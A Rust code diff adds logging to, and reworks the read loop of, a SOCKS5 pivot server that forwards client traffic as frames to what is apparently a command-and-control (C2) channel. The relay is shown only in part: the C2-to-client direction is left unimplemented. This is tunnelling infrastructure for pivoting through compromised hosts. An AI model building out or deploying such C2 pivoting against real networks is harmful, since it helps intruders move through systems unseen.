@@ -27,6 +27,7 @@ impl Socks5PivotServer {
         loop {
             match listener.accept().await {
                 Ok((stream, _)) => {
+                    info!("[SOCKS5-PIVOT] New SOCKS5 client connection");
                     let pivot_tx = self.pivot_tx.clone();
                     let handler = pivot_handler.clone();
                     tokio::spawn(async move {
@@ -59,6 +60,7 @@ async fn handle_socks5_client(
     stream.read_exact(&mut methods).await?;
     // Reply: version 5, no authentication (0x00)
     stream.write_all(&[0x05, 0x00]).await?;
+    info!("[SOCKS5-PIVOT] SOCKS5 handshake complete");
 
     // 2. Parse CONNECT request
     let mut header = [0u8; 4];
@@ -92,10 +94,12 @@ async fn handle_socks5_client(
 
     // 3. Assign unique stream ID
     let stream_id = STREAM_ID_COUNTER.fetch_add(1, Ordering::Relaxed);
+    info!("[SOCKS5-PIVOT] CONNECT to {} (stream_id={})", addr, stream_id);
 
     // 4. Send PivotFrame::Open to C2
     let open_frame = PivotFrame::open(stream_id, addr.clone());
     pivot_tx.send(open_frame).await?;
+    info!("[SOCKS5-PIVOT] Sent PivotFrame::Open for stream_id {}", stream_id);
 
     // 5. Reply to client: success
     // Version, success, reserved, address type, bind addr/port (dummy)
@@ -113,27 +117,36 @@ async fn handle_socks5_client(
     let stream = Arc::try_unwrap(stream_arc)
         .map_err(|_| "Failed to unwrap Arc for stream splitting")?
         .into_inner();
-    let (mut reader, mut writer) = stream.into_split();
+    let (mut reader, _writer) = stream.into_split();
 
     let c2_sender = pivot_tx.clone();
 
-    // Task: Read from SOCKS client, send to C2
-    let read_task = tokio::spawn(async move {
+    let _read_task = tokio::spawn(async move {
         let mut buf = [0u8; 4096];
         loop {
-            let n = match reader.read(&mut buf).await {
-                Ok(0) => break, // EOF
-                Ok(n) => n,
-                Err(_) => break,
-            };
-            let frame = PivotFrame::data(stream_id, buf[..n].to_vec());
-            if c2_sender.send(frame).await.is_err() {
-                break;
+            match reader.read(&mut buf).await {
+                Ok(0) => {
+                    log::info!("[SOCKS5-PIVOT] Client closed connection (stream_id={})", stream_id);
+                    break;
+                }
+                Ok(n) => {
+                    log::debug!("[SOCKS5-PIVOT] Read {} bytes from SOCKS5 client (stream_id={})", n, stream_id);
+                    let frame = PivotFrame::data(stream_id, buf[..n].to_vec());
+                    if c2_sender.send(frame).await.is_err() {
+                        log::warn!("[SOCKS5-PIVOT] Failed to send data frame to C2 (stream_id={})", stream_id);
+                        break;
+                    }
+                }
+                Err(e) => {
+                    log::error!("[SOCKS5-PIVOT] Error reading from client (stream_id={}): {:?}", stream_id, e);
+                    break;
+                }
             }
         }
-        // Send close frame on EOF/error
         let _ = c2_sender.send(PivotFrame::close(stream_id)).await;
+        log::info!("[SOCKS5-PIVOT] Sent close frame to C2 (stream_id={})", stream_id);
     });
+    info!("[SOCKS5-PIVOT] Started relay for stream_id {}", stream_id);
 
     // Task: Wait for relay to finish (optional: handle C2->client in handler)
     // Need to implement logic in Socks5PivotHandler::handle_frame
